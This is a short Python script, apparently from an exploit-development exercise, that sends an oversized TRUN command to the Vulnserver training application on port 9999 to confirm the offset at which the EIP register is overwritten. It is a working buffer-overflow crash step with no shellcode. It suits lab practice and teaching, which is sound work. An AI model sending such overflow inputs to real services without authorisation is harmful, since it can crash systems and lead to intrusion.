#########################################################################################
# Title: Vulnserver TRUN command exploit
# Author: Marco Lugo
# Description: confirm that 2003 is the right offset to overwrite the EIP register
#              EIP is be overwritten by 4 42s (Bs)
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os

target_ip = sys.argv[1]
buffer = 'TRUN /.:/' 
pattern = '\x41'*2003 + '\x42'*4 + '\x43'*3193
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()


